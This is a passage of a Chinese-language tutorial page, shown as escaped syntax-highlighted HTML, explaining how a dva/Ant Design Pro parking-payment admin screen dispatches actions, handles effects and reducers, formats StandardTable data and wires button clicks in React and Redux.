            &lt;span class=&quot;na&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'parkingPayManager/queryChannelList'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;nx&quot;&gt;message&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'successfully '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setState&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                        &lt;span class=&quot;na&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**传递数据*/&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;paymentTypeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;支付宝&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;微信&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;channelWayData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;小程序,公众号&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;desc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;APP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;selectedRows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;formType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/** 0 add  1 edit 定义Form的弹出的模式  **/&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**
    * @param  {state:Object} ... 里面多个参数 
    *
    */&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isLoading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,...&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parentMethods&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;handleAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handleAdd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;handleModalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handleModalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;optionChildrenDataTemp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;optionChildrenData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;formType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;formType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

        &lt;span class=&quot;na&quot;&gt;handleEdit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handleEdit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;channelWayData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelWayData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;paymentTypeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;paymentTypeData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;


     &lt;span class=&quot;cm&quot;&gt;/**
     * 组件参数配置（render =&amp;gt; （这里面定义的组件））
     * @param {array}  parentMethods 是我们传递的参数组[多个]
     *
     * @param {boolean}  modalVisible 模态框 弹出还暗示隐藏的状态
     */&lt;/span&gt;
     &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CreateForm&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;parentMethods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;modalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;
     &lt;span class=&quot;cm&quot;&gt;/** models 里面的方法 */&lt;/span&gt;
     &lt;span class=&quot;cm&quot;&gt;/**
     *@param {Object} payload 是我们提交的参数，或者是用来修改数据等。
     *@param {function} callback 执行成功的回调可以将参数 call回去。
     **/&lt;/span&gt;
     &lt;span class=&quot;na&quot;&gt;effects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;insertChannelCfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;call&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;insertParkManagerChannelCfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;result Data  successfully&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'updateStateInsertChannelCfg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;na&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                &lt;span class=&quot;cm&quot;&gt;/**
                *  (response.success) ? response.data : [], 也可以这样去写
                */&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nx&quot;&gt;callback&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;cm&quot;&gt;/*
                * callback(response);
                * 可以将参数携带回去，也可以不携带，具体看下需求
                **/&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/**
    *@param {reducers} 通过reducers -&amp;gt; updateStateInsertChannelCfg 将数据传递回去
    **/&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;reducers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;updateStateInsertChannelCfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;InsertChannelCfgNum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
            &lt;span class=&quot;cm&quot;&gt;/** InsertChannelCfgNum 记得在 state 里面注册 否则会出现undef */&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
     &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

     &lt;span class=&quot;cm&quot;&gt;/***
     * 解答一下 `namespace: 'parkingPayManager'`
     *  我们在dispatch 里面通过type 调用的 是先通过 namespace 再去找到具体的(effects)内的执行器。
     *
     **/&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/** services [用来发送请求，并且将数据携带回去] **/&lt;/span&gt;

    &lt;span class=&quot;cm&quot;&gt;/**
    *@param {JSON} params 我们传递的参数，
    *@func  request 是自己封装的一个请求的方法。
    **/&lt;/span&gt;
    &lt;span class=&quot;kr&quot;&gt;export&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;async&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;insertParkManagerChannelCfg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'/proxy-post/insertChannelCfg'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;na&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'POST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;params&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;ant-standardtable-数据格式&quot;&gt;&lt;span id=&quot;form_2&quot;&gt;&lt;font&gt;Ant StandardTable 数据格式&lt;/font&gt;&lt;/span&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;开始演示&lt;/p&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
     &lt;span class=&quot;cm&quot;&gt;/**
     * 我们通过 model获得的数据将如何渲染出去是个问题，StandardTable是一个 ant封装的组件，如果你要用他的组件就要满足他的数据格式
     **/&lt;/span&gt;
         &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;parkingPayManager&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;channelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}}&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;props&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
             &lt;span class=&quot;kr&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;newdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
             &lt;span class=&quot;na&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;na&quot;&gt;pagination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;channelData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;pageSize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
                 &lt;span class=&quot;na&quot;&gt;current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
             &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
         &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

         &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;

             &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;StandardTable&lt;/span&gt;
             &lt;span class=&quot;nx&quot;&gt;selectedRows&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;selectedRows&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
             &lt;span class=&quot;nx&quot;&gt;loading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;isLoading&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
             &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;newdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
             &lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;columns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
             &lt;span class=&quot;sr&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;按钮onclick渲染触发&quot;&gt;&lt;span id=&quot;form_3&quot;&gt;&lt;font&gt;按钮onClick，渲染触发。&lt;/font&gt;&lt;/span&gt;&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;按钮定义&lt;/p&gt;

    &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;cm&quot;&gt;/**
      * ()=&amp;gt;this.ModifyHandleModalVisible(row,true) 用匿名函数的方式定义不会再加载的时候被触发
      *
      * this.ModifyHandleModalVisible(row,true)  这样会直接被触发（渲染周期开始）。
      **/&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Button&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;edit&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;onClick&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{()&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ModifyHandleModalVisible&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)}&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;err&quot;&gt;修改&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/Button&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
    &lt;/div&gt;
    &lt;h4 id=&quot;dispatch-type-payload-获得数据的流程redux-&quot;&gt;&lt;span id=&quot;form_4&quot;&gt;&lt;font&gt;dispatch type payload 获得数据的流程(Redux) &lt;/font&gt;&lt;/span&gt;&lt;/h4&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;第一个问题什么是 Store , Store主要功能&lt;/p&gt;

    &lt;ol&gt;
      &lt;li&gt;
        &lt;p&gt;Store需要负责接收Views传来的Action 然后，根据Action.type和Action.payload对Store里的数据进行修改
 最后，&lt;/p&gt;
      &lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;Store还需要通知Views，数据有改变，Views便去获取最新的Store数据，通过setState进行重新渲染组件（&lt;code class=&quot;highlighter-rouge&quot;&gt;re-render&lt;/code&gt;）&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Store如何接收来自Views的Action?
    &lt;ol&gt;
      &lt;li&gt;每一个Store实例都拥有dispatch方法，Views只需要通过调用该方法，并传入action对象作为形参，Store自然就就可以收到Action，就像这样：
        &lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;      &lt;span class=&quot;nx&quot;&gt;store&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dispatch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;({&lt;/span&gt;
  &lt;span class=&quot;na&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'modal(namespace)/function Name'&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
        &lt;/div&gt;
      &lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;Store在接收到Action之后，需要根据Action.type和Action.payload修改存储数据，那么，这部分逻辑写在哪里，且怎么将这部分逻辑传递给Store知道呢？
